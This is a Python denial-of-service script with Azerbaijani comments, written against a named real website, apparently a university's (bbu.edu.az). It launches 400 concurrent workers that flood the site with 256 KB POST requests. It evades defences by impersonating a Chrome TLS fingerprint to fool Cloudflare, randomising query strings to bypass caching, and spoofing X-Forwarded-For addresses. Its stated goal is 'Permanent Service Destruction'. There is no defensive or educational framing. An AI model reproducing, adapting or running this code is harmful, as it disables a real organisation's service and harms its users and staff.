import asyncio
import random
import time
from curl_cffi.requests import AsyncSession

# --- HƏDƏF VƏ DƏHŞƏTLİ GÜC ---
TARGET = "https://bbu.edu.az" # Hədəf
CONCURRENCY = 400 # Railway resurslarını saniyədə 400 paralel hücum xətti ilə doldururuq

# Serverin CPU/RAM-ını "yandıran" ağır payload (256 KB)
# Bu datanı emal etmək serverin prosessoruna ciddi yük salacaq
HEAVY_PAYLOAD = "x=" + ("Z" * 262144) 

async def attack(worker_id):
    """Hər worker serverin DB və ya PHP/ASP mühərrikini kilidləmək üçün işləyir"""
    while True:
        try:
            # Müasir Chrome TLS barmaq izi (JA3) - Cloudflare bunu real insan sanacaq
            async with AsyncSession(impersonate="chrome120") as session:
                # Cache bypass üçün dinamik və ağır endpoint
                # Əgər saytın axtarış və ya login hissəsini bilsəniz "/" əvəzinə onu yazın
                url = f"{TARGET}/?s={random.random()}&ts={time.time()}"
                
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "X-Requested-With": "XMLHttpRequest",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }

                # Ağır POST sorğusu: Server bu 256KB-ı emal edərkən donacaq
                resp = await session.post(url, data=HEAVY_PAYLOAD, headers=headers, timeout=20)
                
                if resp.status_code >= 500:
                    print(f"[KILL-{worker_id}] SUCCESS! Server Status: {resp.status_code} (CRASHING)")
                else:
                    print(f"[PULSE-{worker_id}] Delivered. Status: {resp.status_code}")

        except Exception:
            # Əgər bura düşürsə, deməli server artıq bağlantını qəbul edə bilmir
            print(f"[FATAL-{worker_id}] Connection Timed Out! SERVER IS DOWN.")
            await asyncio.sleep(0.1)

async def main():
    print(f"[*] Hakai-Cataclysm-V6 Devrədə. Məqsəd: Permanent Service Destruction.")
    tasks = []
    for i in range(CONCURRENCY):
        tasks.append(asyncio.create_task(attack(i)))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
